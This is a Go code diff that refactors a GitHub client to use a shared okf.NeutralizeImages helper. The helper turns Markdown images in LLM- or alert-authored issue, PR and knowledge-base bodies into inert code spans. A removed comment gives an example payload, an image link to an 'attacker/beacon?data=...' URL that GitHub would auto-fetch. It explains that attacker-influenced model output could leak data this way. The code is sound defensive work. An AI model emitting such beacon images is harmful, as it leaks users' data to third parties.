@@ -14,7 +14,6 @@ import (
 	"io"
 	"net/http"
 	"net/url"
-	"regexp"
 	"strings"
 	"time"
 
@@ -396,28 +395,6 @@ func (c *Client) Close(ctx context.Context, number int) error {
 		map[string]any{"state": "closed"}, nil)
 }
 
-// imageRe matches Markdown image syntax: ![alt text](url). Alt text and URL
-// may be anything the model or alert pipeline wrote — an attacker-influenced
-// investigation body could carry ![](https://attacker/beacon?data=...) which
-// GitHub auto-fetches on render, leaking the KB URL and timing to a third party.
-var imageRe = regexp.MustCompile(`!\[([^\]]*)\]\([^)]*\)`)
-
-// neutralizeImages replaces every Markdown image in untrusted body text with a
-// non-fetching inline code span so the intent (there was an image reference) is
-// preserved for reviewers while GitHub never issues an outbound fetch. Applied
-// to all body text that reaches GitHub-rendered surfaces (issue body, PR body,
-// KB entry file body).
-func neutralizeImages(s string) string {
-	return imageRe.ReplaceAllStringFunc(s, func(m string) string {
-		// Extract the alt text (between ![ and ]) for the replacement label.
-		alt := imageRe.FindStringSubmatch(m)
-		if len(alt) < 2 || alt[1] == "" {
-			return "`[image]`"
-		}
-		return "`[image: " + alt[1] + "]`"
-	})
-}
-
 func issueTitle(inv providers.Investigation) string {
 	if inv.Title != "" {
 		return inv.Title
@@ -436,7 +413,7 @@ func issueBody(inv providers.Investigation) string {
 	}
 	// Neutralize image markdown before GitHub renders the body: an attacker-
 	// influenced investigation could carry ![](url) which GitHub auto-fetches.
-	return neutralizeImages(b.String())
+	return okf.NeutralizeImages(b.String())
 }
 
 // prBody is the GitHub PR description: a one-line why-keep summary so the PR list
@@ -469,7 +446,7 @@ func (c *Client) prBody(e providers.KBEntry) string {
 		body += "\n\n" + m
 	}
 	// Neutralize image markdown in the untrusted description (LLM-authored).
-	return neutralizeImages(body)
+	return okf.NeutralizeImages(body)
 }
 
 // suspectedDuplicateSection renders the dedup decider's possible-duplicate flag
@@ -544,7 +521,7 @@ func (c *Client) blobURL(path string) string {
 // The body is neutralized here (LLM/alert-authored, GitHub auto-renders it);
 // okf.Render itself writes bodies verbatim.
 func renderEntry(e providers.KBEntry) string {
-	e.Body = neutralizeImages(e.Body)
+	e.Body = okf.NeutralizeImages(e.Body)
 	return okf.Render(e, okf.Meta{Timestamp: time.Now().UTC().Format(time.RFC3339)})
 }
 
